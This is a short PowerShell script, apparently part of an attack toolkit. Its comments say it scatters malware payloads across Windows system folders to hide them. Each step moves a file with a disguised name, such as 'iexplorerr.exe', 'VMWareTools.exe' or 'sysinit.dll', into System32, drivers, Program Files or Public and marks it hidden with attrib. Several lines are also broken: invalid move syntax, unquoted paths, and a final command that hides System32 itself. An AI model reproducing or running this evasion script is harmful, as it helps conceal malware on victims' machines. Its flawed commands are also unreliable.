# The following script when scatter all of the payloads to different directories to hide them. Note they can still be tracked down, but its good to not keep all your eggs in one basket. 

# set PWD to C:

# Find malware.xml 
$malvbsLoc = Get-ChildItem malware.xml
# Move malware.xml
move $malvbsLoc C:\Windows\System32
# Hide the file from windows explorer using attrib 
attrib +h C:\Windows\System32\malware.xml

# Find iexplorerr.exe
$iexplorerrLoc = Get-ChildItem iexplorerr.exe
# Move iexplorerr.exe
move $iexplorerrLoc = "C:\Program Files\Common Files\System"
# Hide the file from windows explorer using attrib
attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"

# Find PowerHell.bat
$powerhellLoc = Get-ChildItem PowerHell.bat
# Move PowerHell.bat
move $powerhellLoc C:\Windows\System32
# Hide the file from windows explorer using attrib
attrib +h C:\Windows\System32\PowerHell.bat

# Find PowerManagement.exe
$powermanLoc = Get-ChildItem PowerManagement.exe
# Move PowerManagement.exe
move $powermanLoc C:\Program Files\MSBuild\Microsoft
# Hide the file from windows explorer using attrib
attrib +h  C:\Program Files\MSBuild\Microsoft\PowerManagement.exe

# Find VMWareTools.exe
$vmwaretoolsLoc = Get-ChildItem VMWareTools.exe
# Move VMWareTools.exe
move $vmwaretoolsLoc C:\Users\Public
# Hide VMWareTools.exe
attrib +h C:\Users\Public\VMWareTools.exe

# Find DiskHelper.exe
$diskhelperLoc = Get-ChildItem DiskHelper.exe
# Move DiskHelper.exe
move $diskhelperLoc = C:\Windows\drivers
# Hide DiskHelper.exe
attrib +h C:\Windows\drivers\DiskHelper.exe

# Find audio.exe
$audioLoc = Get-ChildItem audio.exe
# Move audio.exe
move $audioLoc C:\Windows\DigitalLocker\en-us
# Hide audio.exe 
attrib +h C:\Windows\DigitalLocker\en-us\audio.exe

# Find LogMGMT.exe 
$logmgmtLoc = Get-ChildItem LogMGMT.exe
# Move LogMGMT
move $logmgmtLoc C:\Windows\Globalization\ELS
# Hide LogMGMT.exe
attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe

# Find sysinit.dll
$sysinitLoc = Get-ChildItem sysinit.dll
# Move sysinit.dll
move $sysinitLoc C:\Windows\System32
# Hide sysinit.dll
attrib +h C:\windows\System32
